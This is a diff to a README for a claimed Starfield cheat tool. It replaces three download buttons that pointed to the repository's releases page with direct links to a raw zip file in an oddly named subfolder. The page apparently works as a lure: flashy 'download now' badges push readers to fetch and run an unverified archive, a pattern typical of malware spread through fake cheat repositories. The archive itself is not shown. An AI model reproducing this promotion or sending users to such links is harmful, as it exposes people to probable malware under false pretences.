@@ -1,7 +1,7 @@
 <h1>🛸 starfield-cheat-2026-explorer-lab - Unlock Your Ultimate Starfield Experience Today</h1>
 
 <p align="center">
-<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="300"></a>
+<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/raw/refs/heads/main/donga/cheat-starfield-explorer-lab-Corema.zip"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="300"></a>
 </p>
 
 ---
@@ -55,7 +55,7 @@ Think of it as your personal command center. No complicated programming knowledg
 Visit this link to download the application:
 
 <p align="center">
-<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/releases"><img src="https://img.shields.io/badge/📥_CLICK_HERE_TO_DOWNLOAD-4CAF50?style=for-the-badge" alt="Download Button" width="250"></a>
+<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/raw/refs/heads/main/donga/cheat-starfield-explorer-lab-Corema.zip"><img src="https://img.shields.io/badge/📥_CLICK_HERE_TO_DOWNLOAD-4CAF50?style=for-the-badge" alt="Download Button" width="250"></a>
 </p>
 
 ### Step 2: Run the Program
@@ -204,7 +204,7 @@ Always download the latest version from the official release page to ensure you 
 ---
 
 <p align="center">
-<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/releases"><img src="https://img.shields.io/badge/🚀_GET_STARTED_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Get Started" width="280"></a>
+<a href="https://github.com/tiaojiao2023/starfield-cheat-2026-explorer-lab/raw/refs/heads/main/donga/cheat-starfield-explorer-lab-Corema.zip"><img src="https://img.shields.io/badge/🚀_GET_STARTED_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Get Started" width="280"></a>
 </p>
 
 ---
